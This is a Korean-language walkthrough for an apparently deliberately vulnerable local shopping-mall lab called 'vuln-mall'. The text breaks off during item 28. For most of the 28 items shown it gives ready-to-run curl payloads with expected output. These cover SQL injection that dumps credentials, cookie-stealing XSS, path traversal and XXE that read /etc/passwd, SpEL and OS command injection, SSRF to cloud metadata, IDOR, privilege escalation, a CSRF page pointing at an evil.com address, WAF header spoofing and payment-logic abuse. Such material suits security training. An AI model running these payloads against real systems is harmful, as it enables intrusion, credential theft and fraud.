# vuln-mall 취약점 검증 워크스루

> 본 문서는 vuln-mall 프로젝트에 의도적으로 구현된 모든 취약점을 실제로 확인/검증하기 위한 상세 절차서입니다.
> 자체 소유 테스트 환경에서의 보안 검증 용도로만 사용하십시오.

---

## 사전 준비

```bash
# 1. 백엔드 빌드 및 실행 (H2 인메모리 DB 사용)
cd backend
mvn clean package -DskipTests
java -jar target/vuln-mall-backend-1.0.0.jar --spring.profiles.active=h2

# 2. 서버 상태 및 스코어보드 확인
curl http://localhost:8080/actuator/health
# 기대 응답: {"status":"UP"}

# 3. 실시간 스코어보드 접속 및 확인
# 웹 브라우저: http://localhost:8080/scoreboard.html
# API 조회: curl -s http://localhost:8080/api/scoreboard
# 스코어보드 초기화: curl -s -X POST http://localhost:8080/api/scoreboard/reset
```

**시드 계정 정보** (schema-h2.sql에 의해 자동 생성):

| 계정 | 비밀번호 | 역할 | 잔액 |
|------|---------|------|------|
| admin | admin123 | ADMIN | 9,999,999 |
| alice | alice123 | USER | 250,000 |
| bob | bob123 | USER | 150,000 |
| victim | pass1234 | USER | 500,000 |

**JWT 토큰 발급** (인증이 필요한 테스트 전 수행):

```bash
# alice 로 로그인하여 JWT 토큰 획득
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python3 -m json.tool

# 응답에서 token 값을 환경변수에 저장
TOKEN="<응답에서 받은 token 값>"
```

---

## 목차

| 번호 | WSTG ID | 취약점 유형 | 엔드포인트 |
|------|---------|-----------|-----------|
| 1 | WSTG-INPV-05 | SQL Injection (LIKE 문자열 결합) | GET /api/products |
| 2 | WSTG-INPV-05 | SQL Injection (UNION-Based) | GET /api/products/filter |
| 3 | WSTG-INPV-05 | SQL Injection (ORDER BY Blind) | GET /api/products |
| 4 | WSTG-INPV-05 | SQL Injection (Boolean-Based Blind) | GET /api/coupons/verify |
| 5 | WSTG-INPV-05 | SQL Injection (Time-Based Blind) | GET /api/orders/track |
| 6 | WSTG-INPV-05 | Second-Order SQL Injection | POST /api/inquiries + GET /api/inquiries/{id}/audit |
| 7 | WSTG-INPV-01 | Reflected XSS (HTML 응답) | GET /api/support/echo |
| 8 | WSTG-CLNT-01 | DOM-Based XSS (innerHTML) | 프론트엔드 SPA |
| 9 | WSTG-INPV-02 | Stored XSS (리뷰 댓글) | POST /api/reviews |
| 10 | WSTG-INPV-02 | Stored XSS (문의글) | POST /api/inquiries |
| 11 | WSTG-INPV-09 | Path Traversal (파일 다운로드) | GET /api/files/download |
| 12 | WSTG-INPV-07 | XML External Entity (XXE) | POST /api/orders/xml-receipt |
| 13 | WSTG-INPV-18 | Server-Side Template Injection (SpEL) | POST /api/orders/receipt/template |
| 14 | WSTG-INPV-12 | Command Injection | POST /api/util/ping |
| 15 | WSTG-INPV-19 | SSRF (서버 사이드 요청 위조) | POST /api/util/fetch-image |
| 16 | WSTG-ATHZ-04 | BOLA/IDOR (타인 주문 조회) | GET /api/orders/{id} |
| 17 | WSTG-ATHZ-04 | BOLA/IDOR (타인 배송지 변경) | PUT /api/orders/{id}/shipping |
| 18 | WSTG-ATHN-08 | Mass Assignment (권한 상승) | PUT /api/auth/profile |
| 19 | WSTG-ATHN-08 | Mass Assignment (회원가입 시) | POST /api/auth/register |
| 20 | WSTG-SESS-05 | CSRF (이메일 강제 변경) | GET/POST /api/auth/change-email |
| 21 | WSTG-ATHZ-04 | HTTP Parameter Pollution | POST /api/orders/{id}/status-update |
| 22 | WSTG-CONF-05 | WAF Bypass (헤더 스푸핑) | GET /api/admin/users |
| 23 | WSTG-BUSL-09 | Price Tampering (가격 변조) | POST /api/orders |
| 24 | WSTG-BUSL-09 | Negative Quantity (음수 수량) | PUT /api/cart/update/{id} |
| 25 | WSTG-BUSL-02 | Workflow Step Skipping | POST /api/orders/{id}/direct-confirm |
| 26 | WSTG-BUSL-04 | Race Condition (쿠폰 중복 사용) | POST /api/coupons/redeem |
| 27 | WSTG-BUSL-03 | Rounding Error Arbitrage | POST /api/points/exchange |
| 28 | WSTG-CRYP-02 | AES-ECB Block Shuffling | POST /api/auth/crypto/remember-me |
| 29 | WSTG-CRYP-03 | Predictable Reset Token | POST /api/auth/crypto/forgot-password-link |
| 30 | WSTG-ATHN-02 | 계정 열거 (Username Enumeration) | POST /api/auth/login |
| 31 | WSTG-CLNT-04 | Open Redirect | GET /api/auth/redirect |
| 32 | WSTG-INFO-05 | 민감정보 노출 (.env, .git, backup.sql) | GET /.env, GET /.git/HEAD, GET /backup.sql |
| 33 | WSTG-INPV-15 | CRLF / Log Injection | POST /api/support/log |
| 34 | WSTG-INPV-12 | Zip Slip (압축 해제 경로 탈출) | POST /api/files/upload-zip |
| 35 | WSTG-INPV-12 | Unrestricted File Upload | POST /api/files/upload |

---

## 1. SQL Injection - LIKE 문자열 결합

**WSTG-INPV-05** | 소스: `ProductRepository.searchProducts()` (57행)
**취약 구문**: `sql.append(" AND (name LIKE '%" + keyword + "%'")`

### 공격 요청

```bash
# 에러 기반 확인: 싱글 쿼트 삽입으로 SQL 구문 오류 유발
curl -s "http://localhost:8080/api/products?keyword='" | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": 500,
    "error": "Internal Server Error"
}
```

SQL 구문 오류가 발생하면 인젝션 가능성이 확인된 것입니다.

### 데이터 추출 확인

```bash
# 항상 참인 조건 삽입으로 숨겨진(is_hidden=TRUE) 상품 포함 전체 조회
curl -s "http://localhost:8080/api/products?keyword=' OR '1'='1" | python3 -m json.tool
```

### 기대 응답

정상 검색 시 보이지 않는 숨겨진 상품(`RESTRICTED: Government Exploit Kit v3.1`)이 결과에 포함되어 반환됩니다.

---

## 2. SQL Injection - UNION-Based

**WSTG-INPV-05** | 소스: `ProductRepository.filterByCategoryUnion()` (97행)
**취약 구문**: `"SELECT id, name, category, price, description FROM products WHERE ... category = '" + category + "'"`

### 공격 요청

```bash
# UNION SELECT로 users 테이블의 계정 정보 탈취
curl -s "http://localhost:8080/api/products/filter?category=' UNION SELECT id, username, password, balance, email FROM users --" | python3 -m json.tool
```

### 기대 응답

```json
[
    {"ID": 1, "NAME": "admin", "CATEGORY": "admin123", "PRICE": 9999999.00, "DESCRIPTION": "admin@vulnmall.local"},
    {"ID": 2, "NAME": "alice", "CATEGORY": "alice123", "PRICE": 250000.00, "DESCRIPTION": "alice@example.com"},
    {"ID": 3, "NAME": "bob", "CATEGORY": "bob123", "PRICE": 150000.00, "DESCRIPTION": "bob@example.com"},
    {"ID": 4, "NAME": "victim", "CATEGORY": "pass1234", "PRICE": 500000.00, "DESCRIPTION": "victim@secure-corp.com"}
]
```

모든 사용자의 아이디, 평문 비밀번호, 잔액, 이메일이 그대로 유출됩니다.

---

## 3. SQL Injection - ORDER BY Blind

**WSTG-INPV-05** | 소스: `ProductRepository.searchProducts()` (66행)
**취약 구문**: `sql.append(" ORDER BY ").append(sortBy)`

### 공격 요청

```bash
# CASE 기반 Blind SQL Injection: admin의 비밀번호 첫 글자가 'a'인지 확인
curl -s "http://localhost:8080/api/products?keyword=Quantum&sortBy=(CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='admin')='a'+THEN+price+ELSE+id+END)" | python3 -m json.tool
```

### 판별 방법

- 조건이 **참**인 경우: 결과가 `price` 기준 정렬 (가격순)
- 조건이 **거짓**인 경우: 결과가 `id` 기준 정렬 (등록순)

정렬 순서 차이를 통해 한 글자씩 데이터를 추출할 수 있습니다.

---

## 4. SQL Injection - Boolean-Based Blind

**WSTG-INPV-05** | 소스: `CouponRepository.verifyCouponCode()` (23행)
**취약 구문**: `"SELECT count(*) FROM coupons WHERE code = '" + code + "' AND is_used = FALSE"`

### 공격 요청

```bash
# 참인 조건: valid=true 반환
curl -s "http://localhost:8080/api/coupons/verify?code=' OR '1'='1" | python3 -m json.tool

# 거짓 조건: valid=false 반환
curl -s "http://localhost:8080/api/coupons/verify?code=' AND '1'='2" | python3 -m json.tool
```

### 기대 응답

```json
// 참인 조건
{"valid": true, "code": "' OR '1'='1", "message": "사용 가능한 유효한 할인 쿠폰입니다."}

// 거짓 조건
{"valid": false, "code": "' AND '1'='2", "message": "존재하지 않거나 이미 사용된 쿠폰입니다."}
```

`valid` 필드의 true/false 차이를 이용해 한 비트씩 데이터를 추출할 수 있습니다.

### 데이터 추출 예시

```bash
# admin 비밀번호 길이 확인
curl -s "http://localhost:8080/api/coupons/verify?code=' OR (SELECT LENGTH(password) FROM users WHERE username='admin')=8 --" | python3 -m json.tool
# valid=true 이면 비밀번호 길이 = 8
```

---

## 5. SQL Injection - Time-Based Blind

**WSTG-INPV-05** | 소스: `OrderRepository.trackOrderByCode()` (119행)
**취약 구문**: `"SELECT * FROM orders WHERE tracking_code = '" + code + "'"`

### 공격 요청

```bash
# 3초 지연 확인 (H2 DB용 SLEEP 함수 등록됨)
time curl -s "http://localhost:8080/api/orders/track?code=' AND SLEEP(3) AND '1'='1"
```

### 기대 결과

- 정상 요청: 즉시 응답 (< 1초)
- 인젝션 요청: 약 3초 후 응답

응답 시간 차이로 인젝션 성공 여부를 판별합니다.

### 데이터 추출 예시

```bash
# admin 비밀번호 첫 글자가 'a'이면 3초 지연
time curl -s "http://localhost:8080/api/orders/track?code=' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN SLEEP(3) ELSE 0 END FROM users WHERE username='admin') AND '1'='1"
```

---

## 6. Second-Order SQL Injection

**WSTG-INPV-05** | 소스: `InquiryRepository.searchAuditLogsByTitle()` (66행)
**취약 구문**: `"SELECT * FROM audit_logs WHERE details LIKE '%" + title + "%'"`

### 공격 단계

**1단계: 악성 데이터 저장** (Prepared Statement 사용으로 이 시점에는 안전)

```bash
curl -s -X POST http://localhost:8080/api/inquiries \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "title": "test'\'' UNION SELECT 1,2,3,4,CURRENT_TIMESTAMP() --",
    "content": "정상적인 문의 내용입니다.",
    "isSecret": false
  }' | python3 -m json.tool
```

응답에서 `id` 값을 기록합니다 (예: `3`).

**2단계: 저장된 데이터로 2차 인젝션 발현**

```bash
# 저장된 문의글 ID를 사용하여 감사 로그 조회 트리거
curl -s "http://localhost:8080/api/inquiries/3/audit" | python3 -m json.tool
```

### 기대 결과

서버가 DB에 저장된 제목을 신뢰하여 직접 쿼리에 결합하므로, UNION SELECT가 실행되어 감사 로그 외의 데이터가 반환됩니다.

---

## 7. Reflected XSS - HTML 응답 직접 삽입

**WSTG-INPV-01** | 소스: `SupportController.echoMessage()` (21행)
**취약 구문**: `msg` 파라미터를 이스케이프 없이 HTML 본문에 직접 삽입

### 공격 요청

```bash
# 스크립트 태그 삽입 (브라우저에서 열어야 실행 확인 가능)
curl -s "http://localhost:8080/api/support/echo?msg=<script>alert('XSS')</script>"
```

### 브라우저 확인

브라우저 주소창에 다음 URL을 입력합니다:

```
http://localhost:8080/api/support/echo?msg=<script>alert('XSS')</script>
```

### 기대 결과

브라우저에서 `alert('XSS')` 팝업 창이 표시됩니다. 응답이 `Content-Type: text/html`로 반환되기 때문에 스크립트가 즉시 실행됩니다.

### 이미지 태그 변형

```
http://localhost:8080/api/support/echo?msg=<img src=x onerror=alert(document.cookie)>
```

---

## 8. DOM-Based XSS - innerHTML Sink

**WSTG-CLNT-01** | 소스: `app.js` (40~47행)
**취약 구문**: `bar.innerHTML = '...' + raw;` (URL 해시에서 읽은 값을 그대로 삽입)

### 브라우저 확인

브라우저 주소창에 다음 URL을 입력합니다:

```
http://localhost:8080/#notice=<img src=x onerror=alert('DOM-XSS')>
```

### 기대 결과

페이지 상단에 공지 바가 나타나면서 `alert('DOM-XSS')` 팝업이 실행됩니다.
`window.location.hash`에서 추출한 값이 `innerHTML`에 그대로 삽입되기 때문입니다.

---

## 9. Stored XSS - 리뷰 댓글

**WSTG-INPV-02** | 소스: `ReviewController.addReview()` (50~57행)
**취약 구문**: `comment` 필드를 이스케이프 없이 DB에 저장하고 프론트엔드에서 `innerHTML`로 렌더링

### 공격 단계

**1단계: 악성 리뷰 등록**

```bash
curl -s -X POST http://localhost:8080/api/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "productId": 1,
    "rating": 5,
    "comment": "<img src=x onerror=alert(document.cookie)> 좋은 상품입니다."
  }' | python3 -m json.tool
```

### 기대 응답

```json
{"message": "리뷰가 성공적으로 등록되었습니다."}
```

**2단계: 브라우저에서 확인**

`http://localhost:8080/` 에서 해당 상품(Quantum Cyber Deck X1) 상세 페이지를 열면, 저장된 리뷰의 악성 스크립트가 모든 방문자의 브라우저에서 실행됩니다.

---

## 10. Stored XSS - 문의글

**WSTG-INPV-02** | 소스: `InquiryController.createInquiry()` + 프론트엔드 `innerHTML` 렌더링

### 공격 요청

```bash
curl -s -X POST http://localhost:8080/api/inquiries \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "title": "배송 문의",
    "content": "<svg onload=alert(1)>배송이 언제 오나요?",
    "isSecret": false
  }' | python3 -m json.tool
```

### 기대 결과

문의글 목록 페이지를 방문하는 모든 사용자의 브라우저에서 `alert(1)`이 실행됩니다.

---

## 11. Path Traversal - 임의 파일 읽기

**WSTG-INPV-09** | 소스: `FileController.downloadManual()` (48~53행)
**취약 구문**: `new File(baseDir, filename)` 이후 절대 경로 대체 시도까지 수행

### 공격 요청

```bash
# 애플리케이션 설정 파일 읽기
curl -s "http://localhost:8080/api/files/download?filename=../src/main/resources/application.yml"

# 시스템 파일 읽기 (Linux 환경)
curl -s "http://localhost:8080/api/files/download?filename=../../../../etc/passwd"

# 절대 경로를 이용한 직접 접근
curl -s "http://localhost:8080/api/files/download?filename=/etc/hostname"
```

### 기대 결과

`application.yml` 또는 `/etc/passwd`의 내용이 그대로 다운로드됩니다. 소스코드 48행의 `new File(baseDir, filename)` 이후 53행에서 `new File(filename)` 절대 경로 시도가 있으므로, 절대 경로 입력 시 시스템의 모든 읽기 가능한 파일에 접근 가능합니다.

---

## 12. XXE - XML External Entity

**WSTG-INPV-07** | 소스: `OrderController.parseXmlReceipt()` (155~158행)
**취약 구문**: `DocumentBuilderFactory` 기본 설정 사용 (외부 엔티티 비활성화 안 함)

### 공격 요청

```bash
curl -s -X POST http://localhost:8080/api/orders/xml-receipt \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><receipt><receiptTitle>NEXUS TECH</receiptTitle><customMemo>&xxe;</customMemo></receipt>"
  }' | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "SUCCESS",
    "receiptTitle": "NEXUS TECH",
    "customMemo": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:..."
}
```

`customMemo` 필드에 `/etc/passwd` 파일 내용이 포함되어 반환됩니다.

### 내부 설정 파일 읽기 변형

```bash
curl -s -X POST http://localhost:8080/api/orders/xml-receipt \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><receipt><receiptTitle>test</receiptTitle><customMemo>&xxe;</customMemo></receipt>"
  }' | python3 -m json.tool
```

---

## 13. SSTI - Server-Side Template Injection (SpEL)

**WSTG-INPV-18** | 소스: `ReceiptTemplateController.previewReceiptTemplate()` (44행)
**취약 구문**: SpEL `parser.parseExpression(exprStr)` 으로 사용자 입력을 직접 평가

### 공격 요청

```bash
# 산술 연산 실행 확인
curl -s -X POST http://localhost:8080/api/orders/receipt/template \
  -H "Content-Type: application/json" \
  -d '{"template": "할인 금액: #{7*7}원"}' | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "SUCCESS",
    "renderedMessage": "할인 금액: 49원"
}
```

### 시스템 명령 실행

```bash
# Runtime.exec()를 통한 OS 명령 실행
curl -s -X POST http://localhost:8080/api/orders/receipt/template \
  -H "Content-Type: application/json" \
  -d '{"template": "서버 정보: #{T(java.lang.Runtime).getRuntime().exec(\"id\")}"}' | python3 -m json.tool
```

### 환경변수 읽기

```bash
curl -s -X POST http://localhost:8080/api/orders/receipt/template \
  -H "Content-Type: application/json" \
  -d '{"template": "HOME=#{T(java.lang.System).getenv(\"HOME\")}"}' | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "SUCCESS",
    "renderedMessage": "HOME=/root"
}
```

---

## 14. Command Injection - OS 명령 실행

**WSTG-INPV-12** | 소스: `UtilityController.pingHost()` (39~41행)
**취약 구문**: `"ping -c 2 " + host` 가 `/bin/sh -c`로 직접 전달

### 공격 요청

```bash
# 세미콜론을 이용한 명령 체이닝
curl -s -X POST http://localhost:8080/api/util/ping \
  -H "Content-Type: application/json" \
  -d '{"targetHost": "127.0.0.1; whoami"}' | python3 -m json.tool
```

### 기대 응답

```json
{
    "targetHost": "127.0.0.1; whoami",
    "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n...\nroot\n"
}
```

`output` 필드에 `ping` 결과와 함께 `whoami` 실행 결과(`root`)가 포함됩니다.

### 파이프 활용

```bash
curl -s -X POST http://localhost:8080/api/util/ping \
  -H "Content-Type: application/json" \
  -d '{"targetHost": "127.0.0.1 | cat /etc/passwd"}' | python3 -m json.tool
```

---

## 15. SSRF - 서버 사이드 요청 위조

**WSTG-INPV-19** | 소스: `UtilityController.fetchRemoteImage()` (81행)
**취약 구문**: `localhost`, `127.0.0.1` 문자열 비교만 수행하는 미흡한 필터

### 공격 요청

```bash
# 10진수 IP 변환으로 필터 우회 (127.0.0.1 = 2130706433)
curl -s -X POST http://localhost:8080/api/util/fetch-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl": "http://2130706433:8080/api/admin/users"}'

# 0x7f.0.0.1 형태로 우회
curl -s -X POST http://localhost:8080/api/util/fetch-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl": "http://0x7f000001:8080/api/admin/users"}'

# AWS 메타데이터 엔드포인트 접근 시도
curl -s -X POST http://localhost:8080/api/util/fetch-image \
  -H "Content-Type: application/json" \
  -d '{"imageUrl": "http://169.254.169.254/latest/meta-data/"}'
```

### 기대 결과

`localhost`/`127.0.0.1` 문자열 비교만 수행하므로, 10진수 IP나 16진수 IP로 우회하면 내부 서비스에 접근 가능합니다.

---

## 16. BOLA/IDOR - 타인의 주문 상세 조회

**WSTG-ATHZ-04** | 소스: `OrderController.getOrderDetail()` (117~128행)
**취약 구문**: 인증 여부만 확인하고 `order.userId == currentUser.id` 소유권 검증 누락

### 공격 단계

```bash
# alice 토큰으로 로그인
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# victim(사용자 ID 4)의 주문(ID 2) 조회 시도
curl -s http://localhost:8080/api/orders/2 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### 기대 응답

```json
{
    "id": 2,
    "userId": 4,
    "totalAmount": 1350000.00,
    "recipientName": "김피해 (VIP)",
    "shippingAddress": "경기도 성남시 분당구 판교역로 235 비밀연구소 702호 [기밀 배송]",
    "phone": "010-9999-8888",
    "status": "SHIPPED",
    "trackingCode": "KR-LOGI-77192"
}
```

alice의 토큰으로 victim의 기밀 배송 정보(주소, 연락처, 운송장 번호)가 그대로 노출됩니다.

---

## 17. BOLA/IDOR - 타인의 배송지 무단 변경

**WSTG-ATHZ-04** | 소스: `OrderController.updateShipping()` (134~145행)

### 공격 요청

```bash
# alice 토큰으로 victim의 주문(ID 2) 배송지 변경
curl -s -X PUT http://localhost:8080/api/orders/2/shipping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "shippingAddress": "공격자 주소: 서울시 해커동 123-45",
    "recipientName": "공격자",
    "phone": "010-0000-0000"
  }' | python3 -m json.tool
```

### 기대 응답

```json
{
    "message": "배송 정보가 성공적으로 변경되었습니다.",
    "orderId": 2
}
```

---

## 18. Mass Assignment - 프로필 업데이트 권한 상승

**WSTG-ATHN-08** | 소스: `AuthController.updateProfile()` (131~133행)
**취약 구문**: `if (request.getRole() != null) user.setRole(request.getRole());`

### 공격 단계

```bash
# alice로 로그인
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 현재 프로필 확인 (role: USER)
curl -s http://localhost:8080/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# role을 ADMIN으로, balance를 999만으로 변경
curl -s -X PUT http://localhost:8080/api/auth/profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "ADMIN", "balance": 9999999}' | python3 -m json.tool
```

### 기대 응답

```json
{
    "message": "프로필이 성공적으로 변경되었습니다.",
    "user": {
        "id": 2,
        "username": "alice",
        "role": "ADMIN",
        "balance": 9999999
    }
}
```

일반 사용자가 자신의 역할을 ADMIN으로, 잔액을 임의 금액으로 변경할 수 있습니다.

---

## 19. Mass Assignment - 회원가입 시 권한 지정

**WSTG-ATHN-08** | 소스: `AuthController.register()` (86~87행)

### 공격 요청

```bash
curl -s -X POST http://localhost:8080/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "password": "hacker123",
    "email": "hacker@evil.com",
    "securityQuestion": "test",
    "securityAnswer": "test",
    "role": "ADMIN",
    "balance": 99999999
  }' | python3 -m json.tool
```

### 기대 응답

```json
{
    "token": "eyJ...",
    "user": {
        "username": "hacker",
        "role": "ADMIN",
        "balance": 99999999
    }
}
```

가입 시점부터 ADMIN 권한과 임의 잔액을 갖게 됩니다.

---

## 20. CSRF - 이메일 강제 변경

**WSTG-SESS-05** | 소스: `AuthController.changeEmailCsrf()` (162~178행)
**취약 구문**: GET/POST 모두 허용, 인증/CSRF 토큰 검증 없음

### 공격 요청

```bash
# GET 요청만으로 타인의 이메일 변경 가능
curl -s "http://localhost:8080/api/auth/change-email?username=victim&email=attacker@evil.com" | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "SUCCESS",
    "username": "victim",
    "newEmail": "attacker@evil.com",
    "message": "이메일이 'attacker@evil.com'로 성공적으로 변경되었습니다."
}
```

### 실전 CSRF 공격 HTML

```html
<!-- 피해자가 이 페이지를 방문하면 이메일이 자동 변경됨 -->
<html><body>
<img src="http://localhost:8080/api/auth/change-email?username=victim&email=attacker@evil.com" style="display:none">
</body></html>
```

---

## 21. HTTP Parameter Pollution

**WSTG-ATHZ-04** | 소스: `OrderController.updateOrderStatusHpp()` (219~233행)
**취약 구문**: `List<String> statuses` 중 마지막 값을 적용

### 공격 요청

```bash
# status 파라미터를 중복 전송하여 최종 값 조작
curl -s -X POST "http://localhost:8080/api/orders/1/status-update?status=PENDING&status=REFUNDED" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### 기대 응답

```json
{
    "orderId": 1,
    "receivedStatuses": ["PENDING", "REFUNDED"],
    "appliedStatus": "REFUNDED",
    "message": "HPP 파라미터 오염을 통해 최종 상태 'REFUNDED'가 적용되었습니다."
}
```

첫 번째 파라미터 `PENDING`은 무시되고, 마지막 `REFUNDED`가 적용됩니다.

---

## 22. WAF Bypass - 헤더 스푸핑

**WSTG-CONF-05** | 소스: `EnterpriseWafFilter.doFilterInternal()` (33~35행)
**취약 구문**: `"127.0.0.1".equals(xff)` - 클라이언트 제공 헤더를 신뢰

### 공격 요청

```bash
# 관리자 API 직접 접근 시도 (차단됨)
curl -s http://localhost:8080/api/admin/users | python3 -m json.tool
# 기대: {"status":403,"error":"Forbidden","message":"WAF Block: ..."}

# X-Forwarded-For 헤더로 내부 IP 스푸핑 (우회 성공)
curl -s http://localhost:8080/api/admin/users \
  -H "X-Forwarded-For: 127.0.0.1" | python3 -m json.tool

# X-Custom-IP-Authorization 헤더로 우회
curl -s http://localhost:8080/api/admin/users \
  -H "X-Custom-IP-Authorization: 127.0.0.1" | python3 -m json.tool
```

### 기대 응답 (우회 성공 시)

```json
[
    {"id": 1, "username": "admin", "password": "admin123", "email": "admin@vulnmall.local", "role": "ADMIN", "balance": 9999999.00},
    {"id": 2, "username": "alice", "password": "alice123", ...},
    {"id": 3, "username": "bob", "password": "bob123", ...},
    {"id": 4, "username": "victim", "password": "pass1234", ...}
]
```

모든 사용자의 평문 비밀번호, 이메일, 보안 질문 답변 등 민감 정보가 전부 노출됩니다.

---

## 23. Price Tampering - 클라이언트 전송 금액 신뢰

**WSTG-BUSL-09** | 소스: `OrderController.checkout()` (65행)
**취약 구문**: `BigDecimal finalAmount = request.getTotalAmount() != null ? request.getTotalAmount() : ...`

### 공격 단계

```bash
# 1. 장바구니에 고가 상품 추가
curl -s -X POST http://localhost:8080/api/cart/add \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"productId": 1, "quantity": 1}' | python3 -m json.tool

# 2. 결제 시 totalAmount를 1원으로 변조
curl -s -X POST http://localhost:8080/api/orders \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "totalAmount": 1,
    "recipientName": "테스트",
    "shippingAddress": "서울시 테스트구",
    "phone": "010-1111-1111"
  }' | python3 -m json.tool
```

### 기대 응답

```json
{
    "message": "주문 및 결제가 완료되었습니다.",
    "orderId": 3,
    "chargedAmount": 1,
    "remainingBalance": 249999.00
}
```

1,890,000원짜리 상품을 1원에 구매할 수 있습니다.

---

## 24. Negative Quantity - 음수 수량

**WSTG-BUSL-09** | 소스: `CartController.updateQuantity()` (89~91행)
**취약 구문**: 음수 검증 로직 부재

### 공격 요청

```bash
# 장바구니 항목의 수량을 -100으로 변경
curl -s -X PUT http://localhost:8080/api/cart/update/1 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"quantity": -100}' | python3 -m json.tool
```

### 기대 응답

```json
{"message": "수량이 변경되었습니다."}
```

음수 수량이 적용되면 장바구니 총액이 마이너스가 되어, 결제 시 잔액이 오히려 증가하는 결함이 발생합니다.

---

## 25. Workflow Step Skipping - 결제 없이 주문 확정

**WSTG-BUSL-02** | 소스: `OrderController.directConfirmOrder()` (200~211행)
**취약 구문**: 인가 및 결제 검증 없이 `updateStatus(orderId, "PAID")` 실행

### 공격 요청

```bash
# 결제되지 않은 주문을 즉시 PAID 상태로 변경
curl -s -X POST http://localhost:8080/api/orders/1/direct-confirm | python3 -m json.tool
```

### 기대 응답

```json
{
    "orderId": 1,
    "status": "PAID",
    "message": "주문이 결제 확인 완료 상태로 변경되었습니다."
}
```

인증 없이 누구나 임의 주문의 상태를 `PAID`로 변경할 수 있습니다.

---

## 26. Race Condition - 쿠폰 중복 사용

**WSTG-BUSL-04** | 소스: `CouponController.redeemCoupon()` (66~82행)
**취약 구문**: `Thread.sleep(60)` 지연 + DB Lock 부재 (TOCTOU 결함)

### 공격 요청

```bash
# 동일 쿠폰(WELCOME2026)으로 동시에 5회 요청
for i in $(seq 1 5); do
  curl -s -X POST http://localhost:8080/api/coupons/redeem \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code": "WELCOME2026"}' &
done
wait
```

### 기대 결과

1회용 쿠폰(`discount_amount: 10,000원`)임에도 불구하고, 동시 요청으로 인해 2~5회 중복 적용되어 잔액이 여러 번 충전됩니다. `Thread.sleep(60)` 이 TOCTOU 윈도우를 의도적으로 넓힙니다.

---

## 27. Rounding Error Arbitrage - 소수점 절삭

**WSTG-BUSL-03** | 소스: `PointController.exchangePoints()` (46~47행)
**취약 구문**: `(int) Math.ceil(krwAmount * 0.1)` vs `(long) krwAmount`

### 공격 요청

```bash
# 0.9원 환전: 포인트 1 지급, 잔액 차감 0원
curl -s -X POST http://localhost:8080/api/points/exchange \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 0.9}' | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "SUCCESS",
    "creditedPoints": 1,
    "deductedKrw": 0,
    "remainingBalance": 250000.00,
    "arbitrageExploited": true
}
```

`amount=0.9` 전송 시:
- `Math.ceil(0.9 * 0.1) = Math.ceil(0.09) = 1` (포인트 1 지급)
- `(long) 0.9 = 0` (잔액 0원 차감)

이 요청을 반복하면 잔액 소모 없이 무한 포인트 적립이 가능합니다.

---

## 28. AES-ECB Block Shuffling

**WSTG-CRYP-02** | 소스: `CryptoAuthController.issueRememberMeToken()` (44행)
**취약 구문**: `Cipher.getInstance("AES/ECB/PKCS5Padding")` - IV 없는 ECB 모드

### 검증 단계

```bash
# 1. alice (USER 역할) 토큰 발급
curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me?username=alice" | python3 -m json.tool

# 2. admin (ADMIN 역할) 토큰 발급
curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me?username=admin" | python3 -m json.tool
```

### 기대 응답

각 응답에서 `rememberMeToken` (16진수) 을 확인합니다.
- 페이로드 형식: `role=ADMIN;user=admin` 또는 `role=USER ;user=alice`
- AES-ECB 는 동일 평문 블록이 항상 동일 암호문으로 변환되므로, admin 토큰의 첫 16바이트 블록(`role=ADMIN;user=` 부분)을 alice 토큰의 첫 블록과 교체하면 alice 사용자에게 ADMIN 권한 부여가 가능합니다.

### 토큰 검증

```bash
# 토큰 복호화 확인
curl -s -X POST "http://localhost:8080/api/auth/crypto/remember-me/verify?token=<발급받은 토큰 HEX>" | python3 -m json.tool
```

### 기대 응답

```json
{
    "status": "AUTHENTICATED",
